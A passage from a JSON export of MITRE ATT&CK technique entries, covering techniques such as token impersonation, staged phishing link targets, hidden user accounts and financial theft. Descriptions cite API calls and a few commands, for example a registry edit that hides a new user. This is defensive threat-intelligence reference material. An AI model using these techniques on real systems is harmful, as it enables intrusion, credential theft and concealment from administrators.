malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)",
    "similar_words": [
      "Login Items"
    ],
    "id": "T1547.015"
  },
  "attack-pattern--84771bc3-f6a0-403e-b144-01af70e5fda0": {
    "name": "Stage Capabilities",
    "example_uses": [
      "has used servers under their control to validate tracking pixels sent to phishing victims."
    ],
    "description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)",
    "similar_words": [
      "Stage Capabilities"
    ],
    "id": "T1608"
  },
  "attack-pattern--84ae8255-b4f4-4237-b5c5-e717405a9701": {
    "name": "Link Target",
    "example_uses": [
      "has created a link to a Dropbox file that has been used in their spear-phishing operations.",
      "has cloned victim organization login pages and staged them for later use in credential harvesting campaigns.  has also made use of a variety of URL shorteners for these staged websites."
    ],
    "description": "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001).Links can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation: Kaspersky-masking)(Citation: mandiant-masking)Adversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect) In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022)",
    "similar_words": [
      "Link Target"
    ],
    "id": "T1608.005"
  },
  "attack-pattern--851e071f-208d-4c79-adc6-5974c85c78f3": {
    "name": "Financial Theft",
    "example_uses": [
      "has maintained leak sites for exfiltrated data in attempt to extort victims into paying a ransom.",
      "targets organizations in a wide variety of sectors via the use of  banking trojan with the goal of financial theft.",
      "has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions prior to attempting to conduct fraudulent transactions.",
      "engages in double-extortion ransomware exfiltrating files then encrypting them in order to prompt victims to pay a ransom.",
      "has deployed ransomware on compromised hosts for financial gain.",
      "can deploy payloads capable of capturing credentials related to cryptocurrency wallets.",
      "targets organizations in high technology higher education and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft.",
      "has stolen and encrypted victim's data in order to extort payment for keeping it private or decrypting it.",
      "has stolen and laundered cryptocurrency to self-fund operations including the acquisition of infrastructure.",
      "demands ransom payments from victims to unencrypt filesystems and to not publish sensitive data exfiltrated from victim networks."
    ],
    "description": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,(Citation: FBI-ransomware) business email compromise (BEC) and fraud,(Citation: FBI-BEC) \"pig butchering,\"(Citation: wired-pig butchering) bank hacking,(Citation: DOJ-DPRK Heist) and exploiting cryptocurrency networks.(Citation: BBC-Ronin) Adversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) to conduct unauthorized transfers of funds.(Citation: Internet crime report 2022) In the case of business email compromise or email fraud, an adversary may utilize [Impersonation](https://attack.mitre.org/techniques/T1656) of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.(Citation: FBI-BEC) This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.(Citation: VEC)Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) (Citation: NYT-Colonial) and [Exfiltration](https://attack.mitre.org/tactics/TA0010) of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.(Citation: Mandiant-leaks) Adversaries may use dedicated leak sites to distribute victim data.(Citation: Crowdstrike-leaks)Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and business disruption.(Citation: AP-NotPetya)",
    "similar_words": [
      "Financial Theft"
    ],
    "id": "T1657"
  },
  "attack-pattern--8565825b-21c8-4518-b75e-cbc4c717a156": {
    "name": "Cloud Storage Object Discovery",
    "example_uses": [
      "can enumerate AWS storage services such as S3 buckets and Elastic Block Store volumes.",
      "can list AWS S3 buckets."
    ],
    "description": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .",
    "similar_words": [
      "Cloud Storage Object Discovery"
    ],
    "id": "T1619"
  },
  "attack-pattern--861b8fd2-57f3-4ee1-ab5d-c19c3b8c7a4a": {
    "name": "Web Cookies",
    "example_uses": [
      "During the   bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key."
    ],
    "description": "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)",
    "similar_words": [
      "Web Cookies"
    ],
    "id": "T1606.001"
  },
  "attack-pattern--866d0d6d-02c6-42bd-aa2f-02907fdc0969": {
    "name": "Log Enumeration",
    "example_uses": [
      "has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs.",
      "has used `wevtutil.exe` and the PowerShell command `Get-EventLog security` to enumerate Windows logs to search for successful logons.",
      "can collect CloudTrail event histories and CloudWatch logs.",
      "has enumerated SECURITY and SYSTEM log files during intrusions.",
      "enumerated logs related to authentication in Linux environments prior to deleting selective entries for defense evasion purposes.",
      "can identify infected system log information.",
      "has the ability to print the trace debug error info and warning logs.",
      "can enumerate the trace debug error info and warning logs on targeted systems."
    ],
    "description": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).Host binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges as novel threat actor) In cloud environments, adversaries may leverage utilities such as the Azure VM Agents `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.In addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.(Citation: Permiso GUI-Vil 2023)",
    "similar_words": [
      "Log Enumeration"
    ],
    "id": "T1654"
  },
  "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d": {
    "name": "Token Impersonation/Theft",
    "example_uses": [
      "uses token manipulation with NtFilterToken as part of UAC bypass.",
      "has the ability to duplicate the users token.",
      "attempts to impersonate an anonymous token to enumerate bindings in the service control manager.",
      "can steal access tokens from exiting processes.",
      "leverages token theft to obtain `lsass.exe` security permissions.",
      "can find a process owned by a specific user and impersonate the associated token.",
      "can use the tokens of users to create processes on infected systems.",
      "can impersonate tokens using LogonUser ImpersonateLoggedOnUser and ImpersonateNamedPipeClient.",
      "can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API.",
      "has the ability to duplicate a token from ntprint.exe.",
      "has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.",
      "can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.",
      "can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.",
      "can impersonate a `lsass.exe` or `vmtoolsd.exe` token.",
      "impersonates the main thread of CExecSvc.exe by calling NtImpersonateThread.",
      "has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.",
      "has the ability to duplicate the users token. For example  may use a variant of Googles ProtoBuf to send messages that specify how code will be executed.",
      "During  threat actors used custom tooling to acquire tokens using `ImpersonateLoggedOnUser/SetThreadToken`."
    ],
    "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
    "similar_words": [
      "Token Impersonation/Theft"
    ],
    "id": "T1134.001"
  },
  "attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7": {
    "name": "Exfiltration to Code Repository",
    "example_uses": [
      "can use GitHub for data exfiltration."
    ],
    "description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ",
    "similar_words": [
      "Exfiltration to Code Repository"
    ],
    "id": "T1567.001"
  },
  "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0": {
    "name": "Cloud Services",
    "example_uses": [
      "During   used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.",
      "has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment including through the use of Azure AD PowerShell.",
      "During   used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.Scattered Spider has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes."
    ],
    "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as Connect-AZAccount for Azure PowerShell, Connect-MgGraph for Microsoft Graph PowerShell, and gcloud auth login for the Google Cloud CLI.In some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
    "similar_words": [
      "Cloud Services"
    ],
    "id": "T1021.007"
  },
  "attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd": {
    "name": "Port Knocking",
    "example_uses": [
      "can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server.",
      "has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.",
      "has authenticated itself to a different implant Cryshell through a port knocking and handshake procedure.",
      "can monitor for a single TCP-SYN packet to be sent in series to a configurable set of ports (200 80 22 53 and 3 in the original code) before opening a port for communication."
    ],
    "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
    "similar_words": [
      "Port Knocking"
    ],
    "id": "T1205.001"
  },
  "attack-pattern--887274fc-2d63-4bdc-82f3-fae56d1d5fdc": {
    "name": "LNK Icon Smuggling",
    "example_uses": [],
    "description": "Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017)LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads. ",
    "similar_words": [
      "LNK Icon Smuggling"
    ],
    "id": "T1027.012"
  },
  "attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54": {
    "name": "Web Services",
    "example_uses": [
      "has established GitHub accounts to host their malware.",
      "has acquired web services for use in C2 and exfiltration.",
      "has created web accounts including Dropbox and GitHub for C2 and document exfiltration.",
      "has used GitHub to host malware linked in spearphishing e-mails.",
      "has created profile pages in Microsoft TechNet that were used as C2 infrastructure.",
      "has used file sharing services including OneHub Sync and TeraBox to distribute tools.",
      "has used newly-created Blogspot pages for credential harvesting operations.",
      "has registered algorithmically generated Twitter handles that are used for C2 by malware such as .  has also used legitimate web services such as Dropbox and Constant Contact in their operations.",
      "has set up Amazon S3 buckets to host trojanized digital products.",
      "For  the threat actors used Dropbox to host lure documents and their first-stage downloader.",
      "During   used file hosting services like DropBox and OneDrive.",
      "has hosted malicious downloads on Github.",
      "has obtained cloud storage service accounts to host stolen data.",
      "created Dropbox accounts for their operations.",
      "has created and used legitimate Microsoft OneDrive accounts for their operations.",
      "has set up Dropbox Amazon S3 and Google Drive to host malicious downloads.",
      "has hosted content used for targeting efforts via web services such as Blogspot.",
      "has hosted malicious files on various platforms including Google Drive OneDrive Discord PasteText ShareText and GitHub.",
      "has acquired Amazon S3 buckets to use in C2.",
      "has established GitHub accounts to host its toolsets.",
      "has leveraged the Discord content delivery network to host malicious content for retrieval during initial access operations.",
      "has used Google Firebase to host malicious scripts.",
      "included the use of OpenConnect VPN Server instances for conducting actions on victim devices."
    ],
    "description": "Adversaries may register for web servicesthat can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29)(Citation: Hacker News GitHub Abuse 2024) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
    "similar_words": [
      "Web Services"
    ],
    "id": "T1583.006"
  },
  "attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a": {
    "name": "Steal Application Access Token",
    "example_uses": [
      "uses stolen tokens to access victim accounts without needing a password.",
      "gathers Kubernetes service account tokens using a variety of techniques.",
      "can steal users access tokens via phishing emails containing malicious links.",
      "has used several malicious applications to steal user OAuth access tokens including applications masquerading as Google Defender Google Email Protection and Google Scanner for Gmail users. They also targeted Yahoo users with applications masquerading as Delivery Service and McAfee Email Protection.",
      "abused access to compromised appliances to collect JSON Web Tokens (JWTs) used for creating virtual desktop sessions during ."
    ],
    "description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the containers token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.(Citation: Cider Security Top 10 CICD Security Risks) If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges. In Azure, an adversary who compromises a resource with an attached Managed Identity, such as an Azure VM, can request short-lived tokens through the Azure Instance Metadata Service (IMDS). These tokens can then facilitate unauthorized actions or further access to other Azure services, bypassing typical credential-based authentication.(Citation: Entra Managed Identities 2025)(Citation: SpecterOps Managed Identity 2022)Token theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.  Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  ",
    "similar_words": [
      "Steal Application Access Token"
    ],
    "id": "T1528"
  },
  "attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc": {
    "name": "Spearphishing Attachment",
    "example_uses": [
      "has used spearphishing with Microsoft Office attachments to enable harvesting of user credentials.",
      "has sent e-mails with malicious attachments that lead victims to credential harvesting websites.",
      "has crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts.",
      "has sent emails to establish rapport with targets eventually sending messages with attachments containing links to credential-stealing sites."
    ],
    "description": "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email. In some cases, they may rely upon the recipient populating information, then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. In other cases, adversaries may leverage techniques such as [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) to harvest user credentials via fake login portals.(Citation: Huntress HTML Smuggling 2024)Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
    "similar_words": [
      "Spearphishing Attachment"
    ],
    "id": "T1598.002"
  },
  "attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd": {
    "name": "Additional Cloud Credentials",
    "example_uses": [
      "can generate SSH and API keys for AWS infrastructure and additional API keys for other IAM users.",
      "During   used aws_consoler to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA.",
      "During the   added credentials to OAuth Applications and Service Principals."
    ],
    "description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)Adversaries may also use the CreateAccessKey API in AWS or the gcloud iam service-accounts keys create command in GCP to add access keys to an account. Alternatively, they may use the CreateLoginProfile API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation: Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024) If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principals roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original accounts API credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence)In Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account.(Citation: Mandiant APT42 Operations 2024) As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the users primary password is reset.(Citation: Microsoft Entra ID App Passwords)",
    "similar_words": [
      "Additional Cloud Credentials"
    ],
    "id": "T1098.001"
  },
  "attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103": {
    "name": "Internal Defacement",
    "example_uses": [
      "has left taunting images and messages on the victims' desktops as proof of system access.",
      "has set the desktop wallpaper on victims' machines to display a ransom note.",
      "After encryption  will capture the desktop background window set the background color to black and change the desktop wallpaper to a newly created bitmap image with the text All your files are encrypted! For more information see README-FOR-DECRYPT.txt.",
      "can change both the desktop wallpaper and the lock screen image to a custom image.",
      "replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a .",
      "can change the desktop wallpaper on compromised hosts.",
      "has dropped ransom notes in targeted folders prior to encrypting the files.",
      "has the ability to change the background wallpaper image to display the ransom note.",
      "renames disk labels on victim hosts to the threat actor's email address to enable the victim to contact the threat actor for ransom negotiation.",
      "left ransom notes in all directories where encryption takes place.",
      "has placed a ransom note on comrpomised systems to warn victims and provide directions for how to retrieve data."
    ],
    "description": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)",
    "similar_words": [
      "Internal Defacement"
    ],
    "id": "T1491.001"
  },
  "attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d": {
    "name": "Hidden Users",
    "example_uses": [
      "has modified the Registry to hide created user accounts.",
      "has modified the Registry to hide created user accounts from the Windows logon screen.",
      "has run reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList /v to hide a newly created user."
    ],
    "description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value Hide500Users to TRUE in the /Library/Preferences/com.apple.loginwindow plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the Hide500Users key value is set to TRUE, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the dscl utility to create hidden user accounts by setting the IsHidden attribute to 1. Adversaries can also hide a users home folder by changing the chflags to hidden.(Citation: Apple Support Hide a User Account) Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true).(Citation: 